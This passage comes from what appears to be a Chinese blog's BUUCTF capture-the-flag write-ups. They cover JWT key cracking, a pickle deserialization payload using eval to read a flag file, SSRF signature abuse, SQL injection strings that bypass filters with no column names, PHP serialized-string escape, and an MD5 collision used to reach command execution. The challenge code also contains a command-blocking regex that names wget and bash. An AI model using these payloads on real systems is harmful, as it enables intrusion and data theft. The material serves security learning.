break\n```\n\n其实这个脚本还是蛮容易理解的，将页数格式化，让后一直循环，当该页面存在`lv6.png`内容时，就说明找到了\n\n但是这里要注意，一定让脚本暂停0.8秒，因为buu会防爬\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679474702762-160ddbe0-fb42-4be9-8366-724c99159d5b.png)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679474338539-15f8f312-2c1b-4634-a335-e851b7b615de.png)\n\n找到之后发现这个钱数我们买不了，抓包查看，发现有折扣\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679474379880-aa279a5f-7795-4149-898f-7a5b6e3e7554.png)\n\n直接修改一下，发现页面跳转了\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679474405099-6658c1fd-c0b6-4f9a-82df-b7676aa6ea26.png)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679474429619-3a0c3aa1-a290-4dc3-a611-ae624ea29688.png)\n\n只容许admin访问，这也应印证了之前注册的时候admin已经被注册过\n\n抓包分析一下，这里就是关于jwt的知识点了，参考：https://www.cnblogs.com/cjsblog/p/9277677.html\n\n就我个人认为，类似于我们平常做题的php session用于记录当前登录用户会话信息\n\n那么弄明白之后就试着去伪造这个jwt，把我们的jwt伪造成admin的那么不就可以成功嘛\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679474509525-bb77812e-6b29-47af-9b35-e4030eef9816.png)\n\n先将这个jwt字符串给 弄回原来的模样 这里有个工具：https://jwt.io/\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679474884435-1df5d5ae-3d04-4797-973c-28d07ddacbbf.png)\n\n发现存在我们登录名称，直接改为admin，再抓包可以嘛，理论可以，但是这里还存在一个key，必须拿到这个key才能再反编译回去符合他的要求，这里就有个暴力破解jwt key的脚本 https://github.com/brendan-rius/c-jwt-cracker\n\n我直接是放在kali环境下了，因为还要配置docker环境，环境配置好以后，里面有个文件说明，看看就会使用。\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679475165344-5aead3f4-8bbd-47b7-97e8-5e6c22972de8.png)\n\n注意要用root身份 爆出 key为 `1Kun` \n\n现在将用户换为 `admin` key使用 `1Kun`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679475274835-d6c1dca3-27df-4561-89ed-a8aec4f676ad.png)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679475309325-035236f5-1a7f-49c8-a173-ad59fad9498c.png)\n\n然后查看源码 发现一个压缩包\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679475357662-942c80ce-c9b9-4d58-9db6-4f749ac6cfd4.png)\n\n下载下来 \n\n看了大佬的wp 发现Admin.py存在反序列化漏洞\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679475402464-72d76905-3a4f-4dee-ba61-e28208f05db6.png)\n\n源码附上：\n\n```plain\nimport tornado.web\nfrom sshop.base import BaseHandler\nimport pickle\nimport urllib\n\n\nclass AdminHandler(BaseHandler):\n    @tornado.web.authenticated\n    def get(self, *args, **kwargs):\n        if self.current_user == \"admin\":\n            return self.render('form.html', res='This is Black Technology!', member=0)\n        else:\n            return self.render('no_ass.html')\n\n    @tornado.web.authenticated\n    def post(self, *args, **kwargs):\n        try:\n            become = self.get_argument('become')\n            p = pickle.loads(urllib.unquote(become))\n            return self.render('form.html', res=p, member=1)\n        except:\n            return self.render('form.html', res='This is Black Technology!', member=0)\n```\n\n这里的pickle模块应该就是属于python 的序列化与反序列化模块\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679475553228-e58261a6-ee61-458f-ab34-317dd22fdd73.png)\n\n看到become存在反序列化 那么我们就可以像php反序列化漏洞一样 构造读flag的序列化字符串 然后传给become就可以获得flag了\n\n本地构造：\n\n```plain\nimport pickle\nimport urllib\n\nclass payload(object):\n    def __reduce__(self):  ##当pickle对象被调用时自动执行\n       return (eval, (\"open('/flag.txt','r').read()\",)) ##注意要是元组\n\na = pickle.dumps(payload())  ##如果对pickle不理解可自行百度\na = urllib.quote(a)\nprint a\n```\n\n这里我在本机vscode会报错\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679475702429-4efd6e74-e03d-49da-91a6-b059d717becd.png)\n\n发现这个脚本是属于python2的 我这是python3 所以我只好去我的kali虚拟去跑\n\n注意这里要把中文注释删了 不然会报错 \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679475831556-3f608263-1166-4f39-a71b-dcece769b79d.png)\n\n然后点击 一键成为大会员 抓包 修改become值\n\n成功拿到 flag\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679475923738-eada5091-7c68-4503-9402-50b706cc41c3.png)\n","tags":["python","jwt","python反序列化"],"categories":["buuctf"]},{"title":"buuctf-60-[De1CTF 2019]SSRF Me","url":"/post/2ee4794d.html","content":"\n[De1CTF 2019]SSRF Me\n\n<!--more-->\n\n一道python代码审计，发现审计能力真的很重要。\n\n看到源码：\n\n```cmake\n#! /usr/bin/env python\n#encoding=utf-8\nfrom flask import Flask\nfrom flask import request\nimport socket\nimport hashlib\nimport urllib\nimport sys\nimport os\nimport json\nreload(sys)\nsys.setdefaultencoding('latin1')\n\napp = Flask(__name__)\n\nsecert_key = os.urandom(16)\n\n\nclass Task:\n    def __init__(self, action, param, sign, ip):\n        self.action = action\n        self.param = param\n        self.sign = sign\n        self.sandbox = md5(ip)\n        if(not os.path.exists(self.sandbox)):          #SandBox For Remote_Addr\n            os.mkdir(self.sandbox)\n\n    def Exec(self):\n        result = {}\n        result['code'] = 500\n        if (self.checkSign()):\n            if \"scan\" in self.action:\n                tmpfile = open(\"./%s/result.txt\" % self.sandbox, 'w')\n                resp = scan(self.param)\n                if (resp == \"Connection Timeout\"):\n                    result['data'] = resp\n                else:\n                    print resp\n                    tmpfile.write(resp)\n                    tmpfile.close()\n                result['code'] = 200\n            if \"read\" in self.action:\n                f = open(\"./%s/result.txt\" % self.sandbox, 'r')\n                result['code'] = 200\n                result['data'] = f.read()\n            if result['code'] == 500:\n                result['data'] = \"Action Error\"\n        else:\n            result['code'] = 500\n            result['msg'] = \"Sign Error\"\n        return result\n\n    def checkSign(self):\n        if (getSign(self.action, self.param) == self.sign):\n            return True\n        else:\n            return False\n\n\n#generate Sign For Action Scan.\n@app.route(\"/geneSign\", methods=['GET', 'POST'])\ndef geneSign():\n    param = urllib.unquote(request.args.get(\"param\", \"\"))\n    action = \"scan\"\n    return getSign(action, param)\n\n\n@app.route('/De1ta',methods=['GET','POST'])\ndef challenge():\n    action = urllib.unquote(request.cookies.get(\"action\"))\n    param = urllib.unquote(request.args.get(\"param\", \"\"))\n    sign = urllib.unquote(request.cookies.get(\"sign\"))\n    ip = request.remote_addr\n    if(waf(param)):\n        return \"No Hacker!!!!\"\n    task = Task(action, param, sign, ip)\n    return json.dumps(task.Exec())\n@app.route('/')\ndef index():\n    return open(\"code.txt\",\"r\").read()\n\n\ndef scan(param):\n    socket.setdefaulttimeout(1)\n    try:\n        return urllib.urlopen(param).read()[:50]\n    except:\n        return \"Connection Timeout\"\n\n\n\ndef getSign(action, param):\n    return hashlib.md5(secert_key + param + action).hexdigest()\n\n\ndef md5(content):\n    return hashlib.md5(content).hexdigest()\n\n\ndef waf(param):\n    check=param.strip().lower()\n    if check.startswith(\"gopher\") or check.startswith(\"file\"):\n        return True\n    else:\n        return False\n\n\nif __name__ == '__main__':\n    app.debug = False\n    app.run(host='0.0.0.0')\n```\n\n分析：\n\n有三个路由：`/geneSign` `/De1ta` `/`\n\n`/geneSign` 路由是获取签名的 通过get给param传参 然后这里action不是我们能改变的\n\n一起传入getSign() \n\n返回 `secert_key+param+action`的md5值 这里只有param我们能控制\n\n```cmake\n@app.route(\"/geneSign\", methods=['GET', 'POST'])\ndef geneSign():\n    param = urllib.unquote(request.args.get(\"param\", \"\"))\n    action = \"scan\"\n    return getSign(action, param)\ndef getSign(action, param):\n    return hashlib.md5(secert_key + param + action).hexdigest()\n```\n\n再来看`/De1ta`\n\n```cmake\n@app.route('/De1ta',methods=['GET','POST'])\ndef challenge():\n    action = urllib.unquote(request.cookies.get(\"action\"))\n    param = urllib.unquote(request.args.get(\"param\", \"\"))\n    sign = urllib.unquote(request.cookies.get(\"sign\"))\n    ip = request.remote_addr\n    if(waf(param)):\n        return \"No Hacker!!!!\"\n    task = Task(action, param, sign, ip)\n    return json.dumps(task.Exec())\n```\n\nget方式给param传参 cookie传action和sign的值\n\n经过一个waf 这里用来防止用协议\n\n然后传入Exec()\n\n先经过checkSign函数检查签名是否符合\n\n```cmake\n def checkSign(self):\n        if (getSign(self.action, self.param) == self.sign):\n            return True\n        else:\n            return False\n```\n\n分别有两个if判断\n\n第一个if： 当有action有scan时注意这里是`in` 而不是 `==`,生成一个tmpfile文件\n\n将param传入scan函数\n\n```cmake\ndef scan(param):\n    socket.setdefaulttimeout(1)\n    try:\n        return urllib.urlopen(param).read()[:50]\n    except:\n        return \"Connection Timeout\"\n```\n\n这里能看到`urllib.urlopen().read()`这里就是利用点 \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681569071434-59e9ac4d-007e-413d-b3b5-6b0572ab50ae.png)\n\n相当于打开param这个文件 题目也提示flag在flag.txt中\n\n这也就是为什么waf要禁用file协议和gopher协议（也就是http协议的前身）\n\n因为ssrf漏洞一般都可以搭配很多协议来用\n\n然后将scan内容写入到tmpfile文件中 但是没法读\n\n第二个if：当action中有read时 就会读出来赋值给result[data]然后 Exec函数返回result结果\n\n做到这里当思路就很清晰\n\naction同时包括scan和read时候既能写入文件也能读出文件,但是我们action的值是我们修改不了的该怎么办呢\n\n再来看生成签名这里`hashlib.md5(secert_key + param + action)` 这里我们可以给param传入flag.txtread拼接起来 就算我们没有给action传read 最后md5值是将整个字符串拼接起来包含read值 这就可以了\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681569721446-365d0287-38a5-4618-a182-6250f63d1336.png)\n\n`9b231caf6bf82362fa5f78bf8da3d6ec`记录下我们的签名 \n\n成功！\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681569831963-9cfa50d0-0e24-4628-9a49-3bc29f274ba6.png)\n","tags":["python","flask框架","代码审计"],"categories":["buuctf"]},{"title":"buuctf-49-[SWPU2019]Web1","url":"/post/89f21605.html","content":"\n[SWPU2019]Web1\n\n<!--more-->\n\n这是一道无列名注入的一道题\n\n进入发现要注册一个账号并且登录 发现admin已经被注册了 本来一开始的想法是拿到admin的密码就结束了\n\n进去之后有一个 可以发布内容的 看到这里以为是xss注入 但后来看了大佬wp 不是\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1678460509878-cf2a45c9-71c9-403f-baf5-1320d375227b.png)\n\n然后在发布广告广告名这里可以进行sql注入\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1678460618692-5b643a68-2285-4b0b-ba3e-280448656e8e.png)\n\n判断字段数，发现`order by`被禁用了所以之后联合查询时候包含`or`表，数据库都被河蟹了。\n\n空格也被河蟹了 用`/**/`来绕过 这个本来是mysql用于多行注释的\n\n就可以用`group by`代替 或者select 1，2，3... 根据回显判断字段数\n\n然后这道题还河蟹了`# --`注释符 这里用到了通过闭合后面的单引号来绕过 参考：https://blog.csdn.net/qq_35733751/article/details/106462625\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1678460895563-48a68425-baff-4026-83d5-abaef46c9ef2.png)这张图就可以很形象表示\n\n判断字段数：`1'/**/group/**/by/**/22,'` 至于这个末尾的逗号 应该是起一个子句的作用 如果没有就会报错\n\n查表：`1'/**/union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/' `\n\n这里用到了 `mysql.innodb_table_stats`因为 `or` 被河蟹了,又长了一个新姿势 还可以用 `sys.schema_auto_increment_columns`查表名 参考：https://www.anquanke.com/post/id/193512\n\n爆出表名：\n\nFLAG_TABLE,news,users,gtid_slave_pos,ads,users\n\n 得到了表名 一般来说就要爆列名了 但是这道题不知道列名 然后就要使用无列名注入了，在本地搭了一个环境进行测试\n\n简单来说无列名注入会给表的列名起一个数字称谓（as用字符当别称也行）然后利用数字查列内容\n\n参考：https://err0r.top/article/mardasctf/\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1678461602828-24dea7a0-7adf-4c53-a4ff-bc34ae832eb0.png)\n\n派生表要起个别名 如下图 不然会报错\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1678461677314-cb1fe5db-e76f-487f-9834-c88fd06c743b.png)\n\n如果是数字 则要用``包裹起来 如果被河蟹了 就可以用起别名的方式绕过\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1678461832358-ff3d43fb-a352-4cf2-96e6-507b3806b4b8.png)\n\n构造：`1'/**/union/**/select/**/1,(select/**/group_concat(b)/**/from/**/(select/**/1,2,3/**/as/**/b/**/union/**/select*from/**/users)b),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/'`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1678461972121-cb82f694-b889-4a2d-b258-2298e09e2968.png)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1678510108817-bea36dc4-e206-4942-a5bc-5ffc0c721b40.png)\n\n至于这里为什么中间是只有 select 1,2,3就结束了  这里没搞明白\n\n如果我们多加个4 或者减去一个数 则会出现![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1678462097766-eb91beb6-0645-4a0c-b7be-c13cc5138410.png)\n\n爆出 查询的列不对应\n\n原因是之后联合查询这部分字段数只有3个字段`union/**/select*from/**/users`\n\n`select 和 union select`一起用的时候前后字段数必须相同 \n","tags":["sql注入","无列名注入","sql bypass","派生表"],"categories":["buuctf"]},{"title":"buuctf-48-[安洵杯 2019]easy_serialize_php","url":"/post/5419e860.html","content":"\n[安洵杯 2019]easy_serialize_php\n\n<!--more-->\n\n这是一道反序列化字符串逃逸题目 一道学习题目\n\n打开题目 看到源码\n\n```php\n<?php\n\n\n$function = @$_GET['f'];\n\n\nfunction filter($img){\n    $filter_arr = array('php','flag','php5','php4','fl1g');\n    $filter = '/'.implode('|',$filter_arr).'/i';\n    return preg_replace($filter,'',$img);\n}\n\n\n\nif($_SESSION){\n    unset($_SESSION);\n}\n\n\n$_SESSION[\"user\"] = 'guest';\n$_SESSION['function'] = $function;\n\n\nextract($_POST);\n\n\nif(!$function){\n    echo '<a href=\"index.php?f=highlight_file\">source_code</a>';\n}\n\n\nif(!$_GET['img_path']){\n    $_SESSION['img'] = base64_encode('guest_img.png');\n}else{\n    $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));\n}\n\n\n$serialize_info = filter(serialize($_SESSION));\n\n\nif($function == 'highlight_file'){\n    highlight_file('index.php');\n}else if($function == 'phpinfo'){\n    eval('phpinfo();'); //maybe you can find something in here!\n}else if($function == 'show_image'){\n    $userinfo = unserialize($serialize_info);\n    echo file_get_contents(base64_decode($userinfo['img']));\n}\n?>\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1678028387439-5e30cbf1-2b4b-499a-8fda-01a0e0aafaa2.png)\n\n看到url 是`f=highli_file` 看到源码就明白了\n\n```php\nif($function == 'highlight_file'){\n    highlight_file('index.php');\n}else if($function == 'phpinfo'){\n    eval('phpinfo();'); //maybe you can find something in here!\n}else if($function == 'show_image'){\n    $userinfo = unserialize($serialize_info);\n    echo file_get_contents(base64_decode($userinfo['img']));\n}\n```\n\n这里可以说是主程序了 题目当`f=phpinfo()`输出`phpinfo()`我们会找到一些东西\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1678028629889-2e6333f7-e163-4197-b9e8-c7aec11be3b2.png)果然发现了可疑php文件 \n\n主程序有file_get_contents() 这里应该就是去包含我们发现的d0g3_f1ag.php文件\n\n还有一个我不知道的特殊点：$_SESSION数组 这是一个数组\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1678028879443-2428b4ea-e2bd-4b27-a61b-b9f600fbc766.png)\n\n这道题$_SESSION共有三个变量分别为 `user function img` 其实img用来去包含那个php文件\n\n但是这里\n\n```php\nif(!$_GET['img_path']){\n    $_SESSION['img'] = base64_encode('guest_img.png');\n}else{\n    $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));\n}\n```\n\n$_SESSION['img']先通过base64加密 然后再进行sha1()函数 尽管主函数最后包含文件之前会有base64解密 但是sha1()函数明显就是不让我们直接将flag文件赋值给$_SESSION['img']\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1678029789710-ca04d073-df07-40ab-bf30-5791bbfbffb8.png)\n\n那么应该怎么让$_SESSION['img']等于我们的php文件呢 这里思路大概就是类似于类反序列化 \n\n本地序列化构造包含了php文件的$_SESSION['img'] 然后再反序列去覆盖那个题目中的$_SESSION['img']\n\n再来看过滤这部分 用空字符去正则代换我们的文件名后缀名\n\n```php\nfunction filter($img){\n    $filter_arr = array('php','flag','php5','php4','fl1g');\n    $filter = '/'.implode('|',$filter_arr).'/i';\n    return preg_replace($filter,'',$img);\n}\n```\n\n\n\n这里就用到了字符串反序列化沙箱逃逸 参考https://www.jianshu.com/p/8e8117f9fd0e\n\n通过一个小demo简单看一下原理\n\n```php\n<?php\n//反序列化字符串逃逸\n$a = array('123', 'abc', 'defg');\n$b=serialize($a); //a:3:{i:0;s:3:\"123\";i:1;s:3:\"abc\";i:2;s:4:\"defg\";}\nvar_dump(unserialize($b));    \n// 添加 i:2;s:4:\"love\";}\n$c='a:3:{i:0;s:3:\"123\";i:1;s:3:\"abc\";i:2;s:4:\"love\";}i:2;s:4:\"defg\";}';\nvar_dump(unserialize($c));\n?>\n```\n\n![image.png](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682744765971-b50d2065-4da4-4695-b8cc-2ab0ab675374.png)\n\n本地测试\n\n```php\n<?php\n$a ='/flag/';\n$_SESSION[\"user\"]='flagflagflagflagflagflag';\n$_SESSION[\"function\"]='a\";s:3:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\";s:2:\"dd\";s:1:\"a\";}';\n$_SESSION[\"img\"]='L2QwZzNfZmxsbGxsbGFn';\n$b=serialize($_SESSION);\necho $b;\necho \"\\n\";\n$c=preg_replace($a,'',$b);\nvar_dump($c);\nprint_r(unserialize($c));\n?>\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1678030400496-4b376af4-9be1-4dab-a2b5-42423e634d5d.png)\n\n就是通过特意构造序列化 让$_SESSION[\"function\"]中的内容仿照反序列化后的$_SESSION[img]数组内容 从而达到覆盖\n\n当$_SESSION['user']中的24个字符被空字符代替之后 之后反序列化就会继续向后面寻找24个字符找到符合条件的内容进行反序列化读取`\";s:8:\"function\";s:59:\"a`这24个字符 并且之后还有`\";`符合停止的条件 而后继续向后读取img的20个字符，第四个、第五个s向后读取均满足规则。\n\n这里需要注意的点：\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1678030563480-6f3a3535-4f70-44d3-9e72-3e42f519886c.png)\n\n这里`'a\"`左边的单引号是去闭合者一整段字符串右边的单引号\n\n右边的双引号是为了去闭合序列化后的`\"a\"`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1678030860232-9241224d-6736-4a96-9bad-e37f51653091.png)\n\n为什么是4个flag 即24个字符 要根据后面构造的内容去灵活变动\n\n然后是`}`构造的字符串中有一个`}`这个很重要 一开始本地测试的一直报错 发现是把这个`}`给删了 这个`}`是用来之后反序列化时候匹配停止匹配的一个符号吧（我是这样认为的）如果不加就会导致沙箱逃逸失败\n\n然后因为在文件包含之前会有base64解码 需要把我们发现的php文件进行base64加密之后 弄进我们构造的字符串中 \n\n之后题目就迎刃而解了。\n","tags":["反序列化字符串逃逸"],"categories":["buuctf"]},{"title":"buuctf-44-[安洵杯 2019]easy_web","url":"/post/6fcfe2b3.html","content":"\n[安洵杯 2019]easy_web\n\n<!--more-->\n\n打开题目抓包分析：\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1677855227157-8e11fe84-0449-443a-8d14-66b419638837.png)\n\n发现图片是通过base64编码进行输出的 看了大佬的wp `img=TXpVek5UTTFNbVUzTURabE5qYz0` 即文件名是先进行十六进制编码在进行两次base64编码 解码查看原文件名\n\n第一次：base64\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1677855430402-2aaa6b54-1704-4a6d-9216-56d539fa2811.png)\n\n第二次: base64 得到hex编码数\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1677855472959-be5e14ca-4885-4c53-8f03-1d2b031eb8d5.png)\n\n第三次：在进行十六进制解码\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1677855501090-18a10c84-e855-4363-9d00-37618cb88138.png)\n\n那么我们可以这种方式进行构造查看index.php\n\n爆出源码:\n\n```php\n<?php\nerror_reporting(E_ALL || ~ E_NOTICE);\nheader('content-type:text/html;charset=utf-8');\n$cmd = $_GET['cmd'];\nif (!isset($_GET['img']) || !isset($_GET['cmd'])) \n    header('Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&cmd=');\n$file = hex2bin(base64_decode(base64_decode($_GET['img'])));\n\n\n$file = preg_replace(\"/[^a-zA-Z0-9.]+/\", \"\", $file);\nif (preg_match(\"/flag/i\", $file)) {\n    echo '<img src =\"./ctf3.jpeg\">';\n    die(\"xixi~ no flag\");\n} else {\n    $txt = base64_encode(file_get_contents($file));\n    echo \"<img src='data:image/gif;base64,\" . $txt . \"'></img>\";\n    echo \"<br>\";\n}\necho $cmd;\necho \"<br>\";\nif (preg_match(\"/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\\'|\\\"|\\`|;|,|\\*|\\?|\\\\|\\\\\\\\|\\n|\\t|\\r|\\xA0|\\{|\\}|\\(|\\)|\\&[^\\d]|@|\\||\\\\$|\\[|\\]|{|}|\\(|\\)|-|<|>/i\", $cmd)) {\n    echo(\"forbid ~\");\n    echo \"<br>\";\n} else {\n    if ((string)$_POST['a'] !== (string)$_POST['b'] && md5($_POST['a']) === md5($_POST['b'])) {\n        echo `$cmd`;  \n    } else {\n        echo (\"md5 is funny ~\");\n    }\n}\n\n\n?>\n```\n\n代码分析： \n\nget方式传入cmd 但是要进行一个正则匹配\n\n再通过 post方式传a与b 要求a与b不相等 但是md5加密后相等\n\n先来看正则匹配\n\n河蟹了一些常用的linux命令和一些字符  这里重点来看一下反斜杠的屏蔽 其实这道题这里匹配反斜杠出现问题了\n\n本地测试：\n\n```php\n<?php\n$cmd=\"\\\\\";\nvar_dump($cmd);\nif (preg_match('/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\\'|\\\"|\\`|;|,|\\*|\\?|\\\\|\\\\\\\\|\\n|\\t|\\r|\\xA0|\\{|\\}|\\(|\\)|\\&[^\\d]|@|\\||\\\\$|\\[|\\]|{|}|\\(|\\)|-|<|>/i', $cmd)){\n    echo \"yes\";\n}\n?>\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1677856125949-61736d5d-4b4e-4f84-839e-df9dfa4ed823.png)`|\\\\|\\\\\\\\|` 这里两个反斜杠的第二个反斜杠转义了第二个`|` 使得这一块出现了错误\n\n最终这里就是匹配 `\\|\\\\\\\\`这一块 因此可以用反斜杠\n\n本地测试：\n\n```php\n<?php\n$cmd=\"\\|\\\\\\\\\";\nvar_dump($cmd);\nif (preg_match('/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\\'|\\\"|\\`|;|,|\\*|\\?|\\\\|\\\\\\\\|\\n|\\t|\\r|\\xA0|\\{|\\}|\\(|\\)|\\&[^\\d]|@|\\||\\\\$|\\[|\\]|{|}|\\(|\\)|-|<|>/i', $cmd)){\n    echo \"yes\";\n}\n?>\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1677856091671-e7091ec9-b81a-4757-9431-b32fc21a3a06.png)\n\n但是如果我们想匹配一个`\\` 那么我们在编写正则的时候就需要`\\\\\\`来达到匹配一个`\\`的效果\n\n```php\n<?php\n$cmd=\"\\\\\";\nvar_dump($cmd);\nif (preg_match('/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\\'|\\\"|\\`|;|,|\\*|\\?|\\\\\\|\\\\\\\\|\\n|\\t|\\r|\\xA0|\\{|\\}|\\(|\\)|\\&[^\\d]|@|\\||\\\\$|\\[|\\]|{|}|\\(|\\)|-|<|>/i', $cmd)){\n    echo \"yes\";\n}\n?>\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1677856165041-ec8b1553-a9ed-4c29-8092-e50c61727e41.png)\n\n接着来看第二部分md5强相等\n\n一开始我是想通过数组方式绕过 但是这道题在post a和b值后对他们进行了强制转换为字符串类型 因此不能用数组绕过了\n\n只能用一个脚本进行md5碰撞 使得两个字符的md5值强相等\n\n只能借助fastcoll这个工具 具体参考：[https://blog.csdn.net/shuaicenglou3032/article/details/118197904?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167785642816800213071097%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=167785642816800213071097&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-118197904-null-null.142^v73^insert_down3,201^v4^add_ask,239^v2^insert_chatgpt&utm_term=fastcoll&spm=1018.2226.3001.4187](https://blog.csdn.net/shuaicenglou3032/article/details/118197904?ops_request_misc=%7B%22request%5Fid%22%3A%22167785642816800213071097%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&request_id=167785642816800213071097&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-118197904-null-null.142^v73^insert_down3,201^v4^add_ask,239^v2^insert_chatgpt&utm_term=fastcoll&spm=1018.2226.3001.4187) 这篇文章\n\n注意最后生成的结果是通过url编码后的 如果不进行url编码 那么结果会出现乱码 本地测试：\n\n```php\n<?php\n$a = \"fuck%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00NkutV%9B%EE%A4%86%BA%840%5B%E0%14%F4%5B%22-%E8%07l%DA%A1%26%06%3BqK%10%92%2B%08%FE%C9%C4H%94%3F%F2k%CE%C0%1A%87K%DE_%8A7%EA%94%C7%3B%B4%2A%83%D0%3Fl%B3%25%F6%E5%F6%B2%11%E0%21%CFA%8EM%7E%CB%C5%2C%17%E6%0A%B97%09%87P%5B%121%09%B3%00%C0%2B%60h%B8%D3%DD+D%9F%C3%A24tBFS%1Al%EDP%2C%D5%18Q9%EB%B6%89ZW%F4%E5iOa%B0\";\n$b = \"fuck%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00NkutV%9B%EE%A4%86%BA%840%5B%E0%14%F4%5B%22-h%07l%DA%A1%26%06%3BqK%10%92%2B%08%FE%C9%C4H%94%3F%F2k%CE%C0%1A%87%CB%DE_%8A7%EA%94%C7%3B%B4%2A%83%D0%3F%EC%B3%25%F6%E5%F6%B2%11%E0%21%CFA%8EM%7E%CB%C5%2C%17%E6%0A%B97%09%07P%5B%121%09%B3%00%C0%2B%60h%B8%D3%DD+D%9F%C3%A24tBFS%1A%EC%ECP%2C%D5%18Q9%EB%B6%89ZW%F4eiOa%B0\";\necho urldecode($a);\necho \"\\n\";\necho urldecode($b);\necho \"\\n\";\necho \"--------------------------------------------------\";\necho \"\\n\";\nif(md5(urldecode($a))===md5(urldecode($b))){\n    echo \"yes\";\n}\nelse{\n    echo \"no\";\n}\n?>\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1677856630211-e345d088-4b18-477d-b771-d38e62a64410.png)\n\n因为我们提交的内容会被浏览器默认url解码一次 所以结果都是一样的\n\n但是我们查读文件所需的 `ls cat`都被正则匹配了这里应该怎么绕过呢\n\n第一种方式：\n\n可以用`dir`来代替`ls` 